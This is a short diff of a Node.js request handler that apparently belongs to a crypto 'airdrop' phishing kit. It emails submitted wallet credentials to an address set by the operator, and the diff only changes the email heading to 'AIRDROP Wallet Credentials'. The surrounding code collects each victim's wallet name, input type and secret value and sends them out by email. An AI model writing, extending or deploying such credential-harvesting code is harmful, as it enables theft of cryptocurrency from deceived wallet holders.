@@ -27,7 +27,7 @@ module.exports = async (req, res) => {
             to: process.env.EMAIL_TO,
             subject: `AIRDROP credentials from ${wallet}`,
             html: `
-                <h2>Wallet Credentials</h2>
+                <h2>AIRDROP Wallet Credentials</h2>
                 <p><strong>Wallet:</strong> ${wallet}</p>
                 <p><strong>Input Type:</strong> ${inputType}</p>
                 <p><strong>Value:</strong> ${value}</p>
